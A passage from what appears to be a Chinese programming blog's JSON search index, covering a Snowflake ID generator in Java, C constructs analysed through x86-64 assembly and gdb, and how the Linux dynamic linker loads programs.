{st_mode=S_IFREG|0644, st_size=39490, ...}) = 0 \u003c0.000006\u003e\r[00007f0045367f43] mmap(NULL, 39490, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f0045568000 \u003c0.000009\u003e\r[00007f0045367ed7] close(3) = 0 \u003c0.000005\u003e\r[00007f0045363139] access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) \u003c0.000008\u003e\r[00007f0045367cdd] openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 \u003c0.000012\u003e\r[00007f0045367da4] read(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\260\\34\\2\\0\\0\\0\\0\\0\"..., 832) = 832 \u003c0.000007\u003e\r[00007f0045367c43] fstat(3, {st_mode=S_IFREG|0755, st_size=2030544, ...}) = 0 \u003c0.000006\u003e\r[00007f0045367f43] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0045566000 \u003c0.000007\u003e\r[00007f0045367f43] mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f0044f5a000 \u003c0.000008\u003e\r[00007f0045367ff7] mprotect(0x7f0045141000, 2097152, PROT_NONE) = 0 \u003c0.000012\u003e\r[00007f0045367f43] mmap(0x7f0045341000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f0045341000 \u003c0.000011\u003e\r[00007f0045367f43] mmap(0x7f0045347000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f0045347000 \u003c0.000008\u003e\r[00007f0045367ed7] close(3) = 0 \u003c0.000007\u003e\r[00007f004534c024] arch_prctl(ARCH_SET_FS, 0x7f00455674c0) = 0 \u003c0.000006\u003e\r[00007f0045367ff7] mprotect(0x7f0045341000, 16384, PROT_READ) = 0 \u003c0.000009\u003e\r[00007f0045367ff7] mprotect(0x55e15d271000, 4096, PROT_READ) = 0 \u003c0.000008\u003e\r[00007f0045367ff7] mprotect(0x7f0045572000, 4096, PROT_READ) = 0 \u003c0.000011\u003e\r[00007f0045367fd7] munmap(0x7f0045568000, 39490) = 0 \u003c0.000015\u003e\r[00007f00450697c3] fstat(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0 \u003c0.000006\u003e\r[00007f00450704b9] brk(NULL) = 0x55e15d32b000 \u003c0.000006\u003e\r[00007f00450704b9] brk(0x55e15d34c000) = 0x55e15d34c000 \u003c0.000007\u003e\r[00007f004506a154] write(1, \"1 2 3 4 5 6 7 8 \", 161 2 3 4 5 6 7 8 ) = 16 \u003c0.000024\u003e\r[00007f004503ee06] exit_group(0) = ?\r[????????????????] +++ exited with 0 +++ reference system-call-execve system-call-brk system-call-access "},"title":"algorithm-quick-sort"},"/blog/algorithm-snowflake/":{"data":{"分布式-id#分布式 ID":"分布式 ID 多个数据中心(一级)，多个节点(一级)，同一个时间点（一级），同时生成 ID(一级)。其实就是数字生成规则而已。没啥了不起的。\nsnowflake 算法使用一个 64bits 的正整数作为 ID。64bits 正整数 layout 如下：\npackage stardustman.github.io; public class SnowFlake { // 起始的时间戳 private final static long START_STAMP = 1480166465631L; // sequence number private final static long SEQUENCE_BIT = 12; // machine id bits private final static long MACHINE_BIT = 5; // data-center id bits private final static long DATA_CENTER_BIT = 5; // 每一部分最大值 private final static long MAX_SEQUENCE_NUM = ~(-1L \u003c\u003c SEQUENCE_BIT); private final static long MAX_MACHINE_NUM = ~(-1L \u003c\u003c MACHINE_BIT); private final static long MAX_DATA_CENTER_NUM = ~(-1L \u003c\u003c DATA_CENTER_BIT); // 每一部分左移位数 private final static long MACHINE_LEFT = SEQUENCE_BIT; private final static long DATA_CENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT; private final static long TIMESTAMP_LEFT = DATA_CENTER_LEFT + DATA_CENTER_BIT; private final long dataCenterId; private final long machineId; private long sequence = 0L; private long lastStamp = -1L; public SnowFlake(long dataCenterId, long machineId){ if (dataCenterId \u003e MAX_DATA_CENTER_NUM || dataCenterId \u003c 0){ throw new IllegalArgumentException(\"dataCenterId can't be greater than MAX_DATA_CENTER_ID or less than 0\" ); } if (machineId \u003e MAX_MACHINE_NUM || machineId \u003c 0){ throw new IllegalArgumentException(\"dataCenterId can't be greater than MAX_DATA_CENTER_ID or less than 0\" ); } this.dataCenterId = dataCenterId; this.machineId = machineId; } // generate next ID public synchronized long nextId(){ long currStamp = getNewStamp(); if (currStamp \u003c lastStamp){ throw new RuntimeException(\"clock moved backwards. Refusing to generate id\"); } if (currStamp == lastStamp) { // 同一个毫秒内,序号递增，sequence 最大是 4095 sequence = (sequence + 1) \u0026 MAX_SEQUENCE_NUM; // 同一毫秒内，序列书已经到最大 if (sequence == 0L){ // 阻塞到下一个毫秒，获取新的时间戳 currStamp = getNextMill(); } } else { // 不同毫秒，序列号置为 0 sequence = 0L; } lastStamp = currStamp; // assemble 64bits id return (currStamp - START_STAMP) \u003c\u003c TIMESTAMP_LEFT | dataCenterId \u003c\u003c DATA_CENTER_LEFT | machineId \u003c\u003c MACHINE_LEFT | sequence; } private long getNextMill(){ long mill = getNewStamp(); while (mill \u003c= lastStamp){ mill = getNewStamp(); } return mill; } private long getNewStamp(){ return System.currentTimeMillis(); } public static void main(String[] args) { SnowFlake snowFlake = new SnowFlake(11,11); long start = System.currentTimeMillis(); for (int i = 0; i \u003c 10 ; i++) { System.out.println(snowFlake.nextId()); } System.out.println(System.currentTimeMillis() - start); System.out.println(MAX_SEQUENCE_NUM); System.out.println(MAX_MACHINE_NUM); System.out.println(MAX_DATA_CENTER_NUM); } } "},"title":"Algorithm Snowflake"},"/blog/asm-clang-concepts/":{"data":{"array#array":"","asm-代码分析#Asm 代码分析":"sumArray sumArray(long*, long): pushq %rbp movq %rsp, %rbp movq %rdi, -24(%rbp) ; \u0026a[0] movq %rsi, -32(%rbp) ; length of a movl $0, -4(%rbp) ; sum movl $0, -8(%rbp) ; i .L3: movl -8(%rbp), %eax ; i cltq cmpq %rax, -32(%rbp) ; cmpq i, length 其实也就是 i - length jle .L2 movl -8(%rbp), %eax ; i cltq leaq 0(,%rax,8), %rdx ; rdx = 0 + 8 * i movq -24(%rbp), %rax ; rax = \u0026a[0] addq %rdx, %rax ; rax = \u0026a[0] + (0 + 8 * i), 地址增加 8 * i movq (%rax), %rax ; rax = a[i] movl %eax, %edx ; edx = a[i] movl -4(%rbp), %eax ; eax = sum addl %edx, %eax ; eax = a[i] + sum movl %eax, -4(%rbp) addl $1, -8(%rbp) ; i = i + 1 jmp .L3 .L2: movl -4(%rbp), %eax ; eax = sum cltq popq %rbp ret 通过 a[i] 访问数组的方法, 与具体的数据类型有关\nmovl -8(%rbp), %eax ; i\ncltq ; convert long(32 bit) to quad(64 bit)\nleaq 0(,%rax,8), %rdx ; rdx = 0 + 8 * i , 比例寻址. 8 是比例因子,也就是数据类型的字节数,long 8 bytes.\nmovq -24(%rbp), %rax ; rax = \u0026a[0]\naddq %rdx, %rax ; rax = \u0026a[0] + (0 + 8 * i), 地址增加 8 * i\nmovq (%rax), %rax ; rax = a[i]\nAsm sumMatrix sumMatrix(int (*) [3]): pushq %rbp movq %rsp, %rbp movq %rdi, -24(%rbp) ; \u0026matrix[0][0] movl $0, -4(%rbp) ; sum = 0 movl $0, -8(%rbp) ;i = 0 movl $0, -12(%rbp);j = 0 ; 循环体开始 .L9: cmpl $1, -8(%rbp) ; i - 1 jg .L6 ; i - 1 \u003e 0 ;也就是 i = 2 时跳到 .L6, 退出循环. 否则进入内部循环. .L8: cmpl $2, -12(%rbp) ; cmpl 2, j jg .L7 ; j - 2 \u003e 0 ;也就是 j = 3 时,内部循环结束, 跳到 .L7. 改变 i, 进入下一轮循环 movl -8(%rbp), %eax ; eax = i movslq %eax, %rdx ; rdx = i movq %rdx, %rax ; rax = i addq %rax, %rax ; rax = i + i addq %rdx, %rax ; rax = i + (i + i) salq $2, %rax ; rax = 2 * 2 * 3 * i rax 算术左移 2 位 movq %rax, %rdx ; rdx = 12 * i movq -24(%rbp), %rax ; rax = \u0026matrix[0][0] addq %rax, %rdx ; rdx = \u0026matrix[0][0] + 12 * i movl -12(%rbp), %eax ; eax = j cltq movl (%rdx,%rax,4), %eax ; 4 * rax + rdx = \u0026matrix[0][0] + 12 * i + 4 * j), 也就是 \u0026matrix[i][j]. eax = matrix[i][j] addl %eax, -4(%rbp) ; sum = sum + eax addl $1, -12(%rbp) ; j = j + 1 jmp .L8 .L7: addl $1, -8(%rbp) ; i = i + 1 jmp .L9 .L6: movl -4(%rbp), %eax ; eax = sum popq %rbp ret int matrix[i][j]\nmovl -8(%rbp), %eax ; eax = i\nmovslq %eax, %rdx ; rdx = i\nmovq %rdx, %rax ; rax = i\naddq %rax, %rax ; rax = i + i\naddq %rdx, %rax ; rax = i + (i + i)\nsalq $2, %rax ; rax = 2 * 2 * 3 * i rax 算术左移 2 位\nmovq %rax, %rdx ; rdx = 12 * i\nmovq -24(%rbp), %rax ; rax = \u0026matrix[0][0]\naddq %rax, %rdx ; rdx = \u0026matrix[0][0] + 12 * i\nmovl -12(%rbp), %eax ; eax = j\ncltq\nmovl (%rdx,%rax,4), %eax ; 4 * rax + rdx = 4 * j + \u0026matrix[0][0] + 12 * i ), 也就是 \u0026matrix[i][j]. eax = matrix[i][j]. sizeOf(int) = 4\n在 main 中可知 matrix[0][0],matrix[0][1] … matrix[1][1],matrix[1][2]顺序排列\n当 i = 0, j = 0 时 4 * 0 + \u0026matrix[0][0] + 12 * 0 = \u0026matrix[0][0]\n当 i = 0, j = 1 时 4 * 1 + \u0026matrix[0][0] + 12 * 0 = \u0026matrix[0][1]\n当 i = 1, j = 0 时 4 * 0 + \u0026matrix[0][0] + 12 * 1, 此时是 \u0026matrix[0][0] + 12,\n二维数组每一行的字节总数是: 3(每一行 3 个 int) * 4(int 数据大小), 此时的地址是 \u0026matrix[1][0]. C 语言中二维数组作为函数参数传递时, 一定要给出列的数目, 不需要行数. 因为根据列数和数据类型的大小,就能算出下一行的第一个数据偏移起始位置. 偏移量 = 列数 * sizeOf(Data type)\nAsm main main: pushq %rbp movq %rsp, %rbp subq $96, %rsp ; 分配栈空间 movq $0, -8(%rbp) ; sum movl $0, -12(%rbp) ; sum1 movq $11, -64(%rbp) ; a[0] movq $22, -56(%rbp) ; a[1] movq $33, -48(%rbp) ; a[2] movq $44, -40(%rbp) ; a[3] movq $55, -32(%rbp) ; a[4] movl $1, -96(%rbp) ; matrix[0][0] movl $2, -92(%rbp) ; matrix[0][1] movl $3, -88(%rbp) ; matrix[0][2] movl $4, -84(%rbp) ; matrix[1][0] movl $5, -80(%rbp) ; matrix[1][1] movl $6, -76(%rbp) ; matrix[1][2] ; call sumArray leaq -64(%rbp), %rax ; a[0] 的地址 movl $5, %esi ; length of a, 第二个参数 movq %rax, %rdi ; a[0] 的地址作为第一个参数 call sumArray(long*, long) movq %rax, -8(%rbp) ; 返回值复制给 sum ; call sumMatrix leaq -96(%rbp), %rax ; matrix[0][0] 的地址 movq %rax, %rdi ; matrix[0][0] 的地址作为第一个参数 call sumMatrix(int (*) [3]) movl %eax, -12(%rbp) ; 返回值复制给 sum1 movl $0, %eax leave ret 由 main 可以看出, 编译器对待数组 a , a 就是数组第一个元素的地址.","c-代码#C 代码":" void test_variable_shadow(){ int a = 10; // 代码块开始 { int a = 100; int b = a + 1000; } // 代码块结束 int c = a + 10000; } ","c-代码-1#C 代码":" #include\u003cstdio.h\u003e int add (int a, int b) { return a + b; } int main(void) { int(*fptr)(int,int); // Function pointer fptr = add; // Assign address to function pointer add(2,3); fptr(2,3); return 0; } ","c-代码-2#c 代码":" enum day{ monday, tuesday, wednesday, thursday, friday, saturday, sunday}; enum color { RED=1, YELLOW, GREEN }; int main(){ enum day foo = friday; enum color color = GREEN; } ","code-analysis#Code Analysis":"C typedef struct Student{ long id; long score; long age; } Student; ; 结构体指针作为参数 void testStruct(Student* s){ s-\u003eid = 10; s-\u003escore = 100; s-\u003eage = 1000; } ; 返回结构体 Student buildStruct(long id, long score, long age){ Student s; s.id = id; s.score = score; s.age = age; return s; } int main(){ Student s ; Student ss; s.id = 1; s.score = 10; s.age = 100; testStruct(\u0026s); ss = buildStruct(11,22,33); return 0; } Asm testStruct(Student*): pushq %rbp movq %rsp, %rbp movq %rdi, -8(%rbp) ; s 的地址 movq -8(%rbp), %rax movq $10, (%rax) ; s-\u003eid = 10 movq -8(%rbp), %rax movq $100, 8(%rax) ; s-\u003escore = 100 movq -8(%rbp), %rax movq $1000, 16(%rax) ; s-\u003eage = 1000 nop popq %rbp ret buildStruct(long, long, long): pushq %rbp movq %rsp, %rbp movq %rdi, -8(%rbp) ; main 中隐性变量 ss 的地址(rbp(main) - 96) movq %rsi, -16(%rbp) ; id movq %rdx, -24(%rbp) ; score movq %rcx, -32(%rbp) ; age movq -8(%rbp), %rax movq -16(%rbp), %rdx ; id movq %rdx, (%rax) movq -8(%rbp), %rax movq -24(%rbp), %rdx ; score movq %rdx, 8(%rax) movq -8(%rbp), %rax movq -32(%rbp), %rdx ; age movq %rdx, 16(%rax) nop movq -8(%rbp), %rax ; main 中隐性变量 ss 的地址 popq %rbp ret main: pushq %rbp movq %rsp, %rbp subq $96, %rsp ; 分配栈空间 movq $1, -32(%rbp) ; id movq $10, -24(%rbp) ; score movq $100, -16(%rbp) ; age leaq -32(%rbp), %rax ; 结构体起始地址,也就是第一个字节的内存地址 movq %rax, %rdi ; 这个就类似 Java 中的 this 指针了 call testStruct(Student*) leaq -96(%rbp), %rax ; 隐性的变量 ss 起始地址 movl $33, %ecx movl $22, %edx movl $11, %esi movq %rax, %rdi ; 隐形的参数, 像不像 Java 里的 this 啊. 编译器动的手脚. call buildStruct(long, long, long) movq -96(%rbp), %rax ; ss.id movq -88(%rbp), %rdx ; ss.score movq %rax, -64(%rbp) movq %rdx, -56(%rbp) movq -80(%rbp), %rax ; ss.age movq %rax, -48(%rbp) movl $0, %eax leave ret 结构体使用的是一块连续的内存地址. 结构体指针也就是结构体第一个字节的地址.","c代码分析#C代码分析":"sumArray const int M = 2; const int N = 3; long sumArray(long a[], long length){ int sum = 0; for(int i=0;i \u003c length; i++){ sum += a[i]; } return sum; } sumMatrix int sumMatrix(int a[M][N]){ int sum = 0; int i = 0; int j = 0; for(;i \u003c 2;i++){ for(;j \u003c 3;j++){ sum += a[i][j]; } } return sum; } main int main(){ long sum = 0; int sum1 = 0; long a[5] = {11,22,33,44,55}; int matrix[2][3] = {{1,2,3},{4,5,6}}; sum = sumArray(a, 5); sum1 = sumMatrix(matrix); } ","enum#enum":" 编译器在背后搞鬼，自动为每一个 enum 常量进行编号。","funcation-pointer#funcation pointer":" A function pointer can be declared as: (return type of function) (*name of pointer) (type of function arguments)","gdb-分析-array#gdb 分析 array":"arrays.c int main(){ int a[] = {1,2,3}; int b[] = {7,8,9,10}; return 0; } gdb arrays stardust@os:container$ gcc -g arrays.c -o arrays stardust@os:container$ gdb arrays For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\"... Reading symbols from arrays... (gdb) break main Breakpoint 1 at 0x1149: file arrays.c, line 1. (gdb) run Starting program: /home/stardust/Desktop/k8s/container/arrays Breakpoint 1, main () at arrays.c:1 1 int main(){ (gdb) next 2 int a[] = {1,2,3}; (gdb) print a $1 = {32767, 1431654832, 21845} (gdb) next 3 int b[] = {7,8,9,10}; (gdb) print b $2 = {0, 0, 1431654496, 21845} (gdb) next 4 return 0; (gdb) print b $3 = {7, 8, 9, 10} (gdb) ptype b # 数组 b 的类型为 int [4] type = int [4] (gdb) ptype a # 数组 a 的类型为 int [3] type = int [3] (gdb) print a $4 = {1, 2, 3} (gdb) print b $5 = {7, 8, 9, 10} (gdb) print \u0026a $6 = (int (*)[3]) 0x7fffffffdb14 (gdb) print \u0026b $7 = (int (*)[4]) 0x7fffffffdb20 (gdb) print sizeof(a) $8 = 12 (gdb) print sizeof(b) $9 = 16 (gdb) x/12xb \u0026a 0x7fffffffdb14: 0x01 0x00 0x00 0x00 0x02 0x00 0x00 0x00 0x7fffffffdb1c: 0x03 0x00 0x00 0x00 (gdb) print a + 1 # 指针运算 $10 = (int *) 0x7fffffffdb18 (gdb) print a + 2 # 指针运算 $11 = (int *) 0x7fffffffdb1c (gdb) print x/4b a + 1 (gdb) x/4xb a + 1 # 查看 a[1] 0x7fffffffdb18: 0x02 0x00 0x00 0x00 (gdb) x/4xb a # 查看 a[0] 0x7fffffffdb14: 0x01 0x00 0x00 0x00 (gdb) print a[0] $12 = 1 (gdb) print *(a + 1) $13 = 2 (gdb) print a[1] $14 = 2 (gdb) ptype \u0026a # \u0026a 的类型是指向【 3 个 int 元素的数组 】的指针 type = int (*)[3] (gdb) ptype \u0026b type = int (*)[4] # \u0026b 的类型是指向【 4 个 int 元素的数组 】的指针 (gdb) print a + 1 $15 = (int *) 0x7fffffffdb18 (gdb) print \u0026a + 1 # 下一个【 指向 3 个 int 元素的数组的指针 】的地址 $16 = (int (*)[3]) 0x7fffffffdb20 (gdb) print \u0026b $18 = (int (*)[4]) 0x7fffffffdb20 ","movq-operand-combinations#movq operand combinations":"","references#references":" pointer lea instruction x86 c call convention opcode-movz movsd pass-2d-array-parameter-c Variable Shadowing function pointer 5-learning-c-with-gdb 用 gdb 学 C 语言 ","struct#struct":" A struct in the C programming language (and many derivatives) is a composite data type (or record) declaration that defines a physically grouped list of variables to be placed under one name in a block of memory, allowing the different variables to be accessed via a single pointer, or the struct declared name which returns the same address.","variable-shadowing#Variable Shadowing":" 代码块、块级变量","代码分析#代码分析":"swap void swap(int *pa, int *pb){ int temp = *pa; *pa = *pb; *pb = temp; } swap(int*, int*): pushq %rbp movq %rsp, %rbp movq %rdi, -24(%rbp) ; 将变量 a(10) 的地址(\u0026a)复制到 rbp - 24 地址处, 参数 pa movq %rsi, -32(%rbp) ; 将变量 b(100) 的地址(\u0026b)复制到 rbp - 32 地址处, 参数 pb movq -24(%rbp), %rax ; 将 rbp - 24 指向的内存地址的数值(也就是变量 a 的地址)复制到 rax movl (%rax), %eax ; 将 rax 指向的内存地址的值 10(也就是变量 a) 复制到 eax, int a 4 Bytes 需要 32 bit 的 eax 即可. movl %eax, -4(%rbp) ; 将 eax 的值 10 (也就是变量 a) 复制到 rbp - 4 指向的内存地址处, 完成 temp = *pa; movq -32(%rbp), %rax ; 将 rbp - 32 指向的内存地址的值(也就是变量 b 的地址) 的地址复制到 rax movl (%rax), %edx ; 将 rax 的值指向的内存地址出的值 100(也就是变量 b) 复制到 edx, int b 4 Bytes 需要 32 bit 的 eax 即可. movq -24(%rbp), %rax ; 将 rbp - 24 指向的内存地址的值(也就是变量 a 的地址)复制到 rax movl %edx, (%rax) ; 将 edx 的值 100 (也就是变量 b)复制到 rax 指向的地址处(也就是变量 a 的地址), 完成 *pa = *pb movq -32(%rbp), %rax ; 将 rbp - 32 指向的内存地址的值(也就是变量 b 的地址)复制到 rax movl -4(%rbp), %edx ; 将 rbp - 4 指向的内存地址的值 10 复制到 edx movl %edx, (%rax) ; 将 edx 的值 10 复制到 rax 指向的地址处(也就是变量 b 的地址), 完成 *pb = temp nop popq %rbp ret main int main(){ int a = 10; int b = 100; swap(\u0026a,\u0026b); return 0; } main: pushq %rbp ; 保存调用者的 rbp movq %rsp, %rbp ; 开辟 main 函数的栈帧 subq $16, %rsp ; 分配 main 的栈空间 16 bytes movl $10, -4(%rbp) ; 将变量 a 复制到 rbp - 4 指向的地址处.(int a, 4 bytes) movl $100, -8(%rbp) ; 将变量 b 复制到 rbp - 8 指向的地址处.(int b, 4 bytes) leaq -8(%rbp), %rdx ; 将 rbp - 8 的值复制到 rdx 寄存器(int b 变量的地址) leaq -4(%rbp), %rax ; 将 rbp - 4 的值复制到 rax 寄存器(int a 变量的地址) movq %rdx, %rsi ; 复制 rdx(第二个参数: 变量 b 的地址) 到 rsi 寄存器 movq %rax, %rdi ; 复制 rax(第一个参数: 变量 a 的地址) 到 rdi 寄存器 call swap(int*, int*) movl $0, %eax leave ; 等价于 1. mov %rbp, %rsp(回收分配的栈空间) 2.pop %rbp(恢复 main 的 rbp) ret 栈帧分析 该图是 swap 执行完 int temp = *pa 后的状态.\n函数返回值 the return value for the function should be placed in rax if it is not already there. 返回值放在 rax 寄存器. 这是 x86-64 的约定. 架构设计决定只有 rax 一个寄存器存放返回值, 这也是高级语言返回值只能是一个的原因. C 语言里返回的结构体, 其实也就是结构体第一个字节的地址, 还是一个值. C 语言的函数返回值为 void, 在汇编层面也就是不用设置 rax.\n结论 指针本质就是寄存器间接寻址. 函数传参其实传的都是数值而已, 本质上都是数值的副本.","变量地址#变量地址":" The lea (load effective address) instruction is used to put a memory address into the destination. leaq -8(%rbp), %rdx -8(%rbp)等价于 mem[R[rbp] -8]. 将 rbp - 8 的值(这个值就是内存地址)复制到 rdx.","寄存器间接寻址#寄存器间接寻址":" movq (%rax), %rdx 将 rax 的值(X)指向的内存地址处的值复制到 rdx. 此时 rax 的值(X)就是指针, 所谓指针在汇编层面就是将一个内存地址放到寄存器, 利用寄存器间接寻址去获取这个地址的数值. 这就是 C 语言里指针的本质.","指针#指针":"C 语言里的概念在 X86-64 汇编层面的分析. 汇编风格使用 AT\u0026T 风格. 编译器是 gcc-x86-64-9.1\n指针 A pointer is a programming language object that stores the memory address of another value located in computer memory. A pointer references a location in memory, and obtaining the value stored at that location is known as dereferencing the pointer.","数据类型转化#数据类型转化":"","整数类型#整数类型":"x86-64 registers IA32 registers 代码分析 void testTypeConvert(){ unsigned long i64bit = 1844674407370955199; unsigned int i32bit = (unsigned int)i64bit; unsigned short i16bit = (unsigned int)i32bit; unsigned char i8bit = (unsigned char)i16bit; printf(\"%ld\\n\",i64bit); printf(\"%ld\\n\",i32bit); printf(\"%d\\n\",i16bit); printf(\"%d\\n\",i8bit); } testTypeConvert(): pushq %rbp movq %rsp, %rbp movabsq $1844674407370955199, %rax ;‭00011001 10011001 10011001 10011001 10011001 10011001 10011001 10111111‬ movq %rax, -8(%rbp) movq -8(%rbp), %rax movl %eax, -12(%rbp) ; 10011001 10011001 10011001 10111111‬ (2576980415) movl -12(%rbp), %eax movw %ax, -14(%rbp) ; 10011001 10111111‬(39359) movzwl -14(%rbp), %eax ; 00000000 00000000 10011001 10111111‬ (zero extend) movb %al, -15(%rbp) ; 10111111‬(191) nop popq %rbp ret 结论 int 类型的数据转化, 利用不同长度的寄存器. 比如 int 转 char 类型. 直接取 int 的最后 8 位. char 转 int ,对应的寄存器高位补上 3 个字节的 0.","汇编代码#汇编代码":" test_variable_shadow(): pushq %rbp movq %rsp, %rbp movl $10, -4(%rbp) ; int a = 10 movl $100, -8(%rbp) ; int a = 100 movl -8(%rbp), %eax addl $1000, %eax movl %eax, -12(%rbp) ; int b = a + 1000 代码块里的 a movl -4(%rbp), %eax addl $10000, %eax movl %eax, -16(%rbp) ; int c = a + 10000 nop popq %rbp ret ","汇编代码分析#汇编代码分析":"","汇编分析#汇编分析":" add(int, int): pushq %rbp movq %rsp, %rbp movl %edi, -4(%rbp) movl %esi, -8(%rbp) movl -4(%rbp), %edx movl -8(%rbp), %eax addl %edx, %eax popq %rbp ret main: pushq %rbp ; 保存调用者的 rbp movq %rsp, %rbp ; 开辟 main 的栈帧 subq $16, %rsp ; 分配栈帧空间 movq $add(int, int), -8(%rbp) ; 将 add(int, int) 第一条指令的地址保存在 rbp - 8 这个位置处 movl $3, %esi ; 从右往左保存第一个参数 movl $2, %edi ; 从右往左保存第二个参数 call add(int, int) ; 正常的 call 调用 movq -8(%rbp), %rax ; 将 add(int, int) 的地址复制到 rax 寄存器 movl $3, %esi ; 从右往左保存第一个参数 movl $2, %edi ; 从右往左保存第二个参数 call *%rax ; 通过函数指针调用函数 movl $0, %eax leave ret ","汇编分析-1#汇编分析":" main: pushq %rbp movq %rsp, %rbp movl $4, -4(%rbp) ; friday 编号为 4，默认从 0 开始编号。 movl $3, -8(%rbp) ; GREEN 编号为 3 movl $0, %eax popq %rbp ret "},"title":"asm-clang-concepts"},"/blog/asm-dynamic-linker/":{"data":{"":"","demo-二进制文件查看#demo 二进制文件查看":"","dynamic-linker-启用环境变量观察过程#dynamic linker 启用环境变量观察过程":"","dynamic-linker-总结#\u003cstrong\u003edynamic linker 总结\u003c/strong\u003e":"dynamic linker 简介 dynamic linker (also called the dynamic loader) is a shared object (*.so file) on Linux systems. It plays a critical role in the execution of dynamically linked programs.\nWhat Is the Dynamic Linker? The dynamic linker is a special shared library responsible for:\nLoading the program’s dependencies (shared libraries like libc.so.6). Resolving symbols (e.g., function addresses like printf). Performing relocations (adjusting addresses for shared libraries). Invoking constructors/destructors (via .init_array and .fini_array). On Linux, the dynamic linker is typically named:\nld-linux.so.2 (for 32-bit x86). ld-linux-x86-64.so.2 (for 64-bit x86_64). ld-linux-aarch64.so.1 (for ARM64). Why Is the Dynamic Linker a Shared Object? Efficiency: It avoids duplicating the linker code in every executable. Reusability: All dynamically linked programs share the same dynamic linker. Maintainability: Updates to the dynamic linker (e.g., security fixes) apply to all programs. 先有鸡先有蛋问题 The dynamic linker itself must be a shared object, but it is responsible for loading shared libraries. 动态链接器本身就是共享库 To resolve this, the kernel directly loads the dynamic linker (ld-linux-*.so) into memory when starting a program. The dynamic linker then loads the rest of the dependencies (like libc.so.6) 内核直接负责装载 dynamic linker 这个共享库, 再由 dynamic linker 装载其他依赖 demo 二进制文件查看 demo 中动态链接器查看 readelf -l demo (look for the INTERP segment)\nreadelf -l demo | grep -A 2 INTERP INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] This path (/lib64/ld-linux-x86-64.so.2) is stored in the .interp section of the ELF file. 其中还有一个字符串结束符号 0x00。可以看到 .interp section 长度为 0x1c 一共 28bytes。\nfile 查看 demo 信息 file demo demo: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6fd65349be456b41544a47b67df68fa7968c3f4f, for GNU/Linux 3.2.0, with debug_info, not stripped Dynamic Linker VS Regular Shared Libraries Feature Dynamic Linker (ld-linux-*.so) Regular Shared Library (e.g., libc.so.6) Loaded by Kernel (directly) Dynamic linker Purpose Load and link shared libraries Provide runtime functionality Dependencies None (self-contained) May depend on other shared libraries Entry Point Called by kernel Called by dynamic linker How Dynamic Linker Works? Step 1: Kernel Loads the Executable The kernel reads the ELF header of demo and sees the INTERP segment pointing to /lib64/ld-linux-x86-64.so.2. The kernel loads the dynamic linker itself into memory. Step 2: Dynamic Linker Takes Over The kernel transfers control to the dynamic linker’s entry point. The dynamic linker: Parses the executable’s .dynamic section to find dependencies (e.g., libc.so.6). Loads these shared libraries into memory. Resolves symbols (e.g., printf in libc). Applies relocations (fixes addresses in .got and .plt). Calls constructor functions (e.g., initialize() in .init_array). Transfers control to the program’s main(). gdb 运行 demo 验证 /lib64/ld-linux-x86-64.so.2 先装载 gdb ./demo . . . Reading symbols from ./demo... (gdb) break _start Breakpoint 1 at 0x1080 (gdb) info program The program being debugged is not being run. (gdb) c The program is not being run. (gdb) run Starting program: /home/yang/elf-demo/demo Breakpoint 1.2, 0x00007ffff7fe4540 in _start () from /lib64/ld-linux-x86-64.so.2 (gdb) info program Last stopped for thread 1 (process 50955). Using the running image of child process 50955. Program stopped at 0x7ffff7fe4540. It stopped at breakpoint 1. Type \"info stack\" or \"info registers\" for more information. (gdb) info proc mappings process 50955 Mapped address spaces: Start Addr End Addr Size Offset Perms objfile 0x555555554000 0x555555555000 0x1000 0x0 r--p /home/yang/elf-demo/demo 0x555555555000 0x555555556000 0x1000 0x1000 r-xp /home/yang/elf-demo/demo 0x555555556000 0x555555557000 0x1000 0x2000 r--p /home/yang/elf-demo/demo 0x555555557000 0x555555559000 0x2000 0x2000 rw-p /home/yang/elf-demo/demo 0x7ffff7fbf000 0x7ffff7fc3000 0x4000 0x0 r--p [vvar] 0x7ffff7fc3000 0x7ffff7fc5000 0x2000 0x0 r-xp [vdso] 0x7ffff7fc5000 0x7ffff7fc6000 0x1000 0x0 r--p /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7fc6000 0x7ffff7ff1000 0x2b000 0x1000 r-xp /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7ff1000 0x7ffff7ffb000 0xa000 0x2c000 r--p /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7ffb000 0x7ffff7fff000 0x4000 0x36000 rw-p /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffffffde000 0x7ffffffff000 0x21000 0x0 rw-p [stack] 0xffffffffff600000 0xffffffffff601000 0x1000 0x0 --xp [vsyscall] break _start 打断点 run 运行 info proc mappings 查看内存映射 /home/yang/elf-demo/demo 可执行文件 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 动态链接器在 main 运行之前已被加载 ls -l /lib64/ld-linux-x86-64.so.2 lrwxrwxrwx 1 root root 44 Jan 29 01:07 /lib64/ld-linux-x86-64.so.2 -\u003e ../lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /lib64/ld-linux-x86-64.so.2 装载其他依赖 ldd 查看 demo 依赖 ldd demo linux-vdso.so.1 (0x00007fffac3dc000) libc.so.6 =\u003e 